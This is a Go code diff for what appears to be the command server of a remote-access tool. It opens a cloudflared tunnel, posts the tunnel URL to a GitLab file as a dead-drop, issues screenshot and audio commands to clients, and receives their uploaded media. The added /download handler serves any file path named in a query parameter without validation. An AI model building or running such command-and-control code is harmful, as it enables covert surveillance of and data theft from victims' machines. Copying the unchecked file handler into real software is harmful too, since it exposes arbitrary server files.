@@ -2,21 +2,23 @@ package main
 
 import (
 	"bufio"
+	"bytes"
+	"context"
+	"encoding/json"
 	"fmt"
 	"io"
+	"log"
 	"net/http"
+	"net/url"
 	"os"
-	"strings"
+	"os/exec"
+	"path/filepath"
+	"regexp"
 	"runtime"
+	"strings"
 	"sync"
 	"time"
-	"os/exec"
-	"context"
-	"regexp"
-	"bytes"
-	"net/url"
-	"encoding/json"
-	"log"
+
 	"github.com/joho/godotenv"
 )
 
@@ -28,16 +30,18 @@ var buf bytes.Buffer
 var tunnelURL string = ""
 var tunnelURLChan = make(chan string)
 
-
-
 type GitLabUpdatePayload struct {
 	Branch        string `json:"branch"`
 	Content       string `json:"content"`
 	CommitMessage string `json:"commit_message"`
 }
 
+type ProgressReport struct {
+	Progress int `json:"progress"`
+}
+
 func updateGitLabFile(projectID, filePath, gitlabToken, tunnelURL string) error {
-	
+
 	encodedPath := url.PathEscape(filePath)
 	apiURL := fmt.Sprintf("https://gitlab.com/api/v4/projects/%s/repository/files/%s", projectID, encodedPath)
 
@@ -153,6 +157,40 @@ func uploadHandler(w http.ResponseWriter, r *http.Request) {
 	fmt.Fprint(w, "File received successfully!")
 }
 
+func handleProgressUpdate(w http.ResponseWriter, r *http.Request) {
+
+	if r.Method != http.MethodPost {
+		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
+		return
+	}
+
+	var report ProgressReport
+	err := json.NewDecoder(r.Body).Decode(&report)
+	if err != nil {
+		http.Error(w, "Invalid JSON", http.StatusBadRequest)
+		return
+	}
+
+	fmt.Printf("Client update received: %d%%\n", report.Progress)
+
+	w.WriteHeader(http.StatusOK)
+}
+
+func downloadHandler(w http.ResponseWriter, r *http.Request) {
+	// Get the file path from query params or body
+	filePath := r.URL.Query().Get("file")
+
+	file, err := os.Open(filePath)
+	if err != nil {
+		http.Error(w, err.Error(), http.StatusNotFound)
+		return
+	}
+	defer file.Close()
+
+	w.Header().Set("Content-Disposition", fmt.Sprintf(`attachment; filename="%s"`, filepath.Base(filePath)))
+	io.Copy(w, file)
+}
+
 func commandHandler(w http.ResponseWriter, r *http.Request) {
 	mutex.Lock()
 	command := strings.Fields(userInput)
@@ -169,6 +207,7 @@ func commandHandler(w http.ResponseWriter, r *http.Request) {
 	case "ss":
 		if len(command) < 2 {
 			fmt.Println("Invalid usage", userInput)
+			userInput = "idle"
 			break
 		}
 
@@ -185,7 +224,8 @@ func commandHandler(w http.ResponseWriter, r *http.Request) {
 		} else {
 			fmt.Fprint(w, userInput)
 			command = nil
-			fmt.Println("sending audio command")
+			userInput = "idle"
+			fmt.Println("sent audio command")
 		}
 
 	default:
@@ -196,8 +236,8 @@ func commandHandler(w http.ResponseWriter, r *http.Request) {
 }
 
 func useRegex(s string) string {
-	re := regexp.MustCompile("(?i)https://[a-z0-9-]+\\.trycloudflare\\.com")
-	
+	re := regexp.MustCompile(`(?i)https://[a-z0-9-]+\.trycloudflare\.com`)
+
 	return re.FindString(s)
 }
 
@@ -230,12 +270,12 @@ func receiveInput() {
 }
 
 func main() {
-	  err := godotenv.Load()
-  	if err != nil {
-  	  log.Fatal("Error loading .env file")
-  	}
+	err := godotenv.Load()
+	if err != nil {
+		log.Fatal("Error loading .env file")
+	}
 
-  	gitlabToken := os.Getenv("TOKEN")
+	gitlabToken := os.Getenv("TOKEN")
 
 	// Ensure the binary is present locally without needing a package manager
 	binPath := ensureCloudflared()
@@ -247,7 +287,7 @@ func main() {
 	cmd := exec.CommandContext(ctx, "./"+binPath, "tunnel", "--protocol", "http2", "--url", "http://localhost:10000")
 	cmd.Stdout = io.Discard
 	cmd.Stderr = &buf
-	
+
 	if err := cmd.Start(); err != nil {
 		fmt.Printf("Failed to start cloudflared: %v\n", err)
 		return
@@ -258,8 +298,6 @@ func main() {
 	tunnelURL = <-tunnelURLChan
 	mutex.Unlock()
 
-	
-
 	time.Sleep(2 * time.Second)
 	fmt.Println("Tunnel is active. Press Ctrl+C to exit.")
 	fmt.Println("The tunnel url is: " + tunnelURL)
@@ -269,13 +307,15 @@ func main() {
 	// Update the Gist with the tunnel URL
 	err = updateGitLabFile("Plexisity1%2Ftunnel-url", "tunnel-url.txt", gitlabToken, tunnelURL)
 	if err != nil {
-	    fmt.Println("Error updating GitLab file:", err)
-	    return
+		fmt.Println("Error updating GitLab file:", err)
+		return
 	}
 	fmt.Println("Successfully updated!")
 
 	http.HandleFunc("/upload", uploadHandler)
 	http.HandleFunc("/get-command", commandHandler)
+	http.HandleFunc("/download", downloadHandler)
+	http.HandleFunc("/progress", handleProgressUpdate)
 
 	go receiveInput()
 	fmt.Println("Receiver running on port 10000. Waiting for media...")
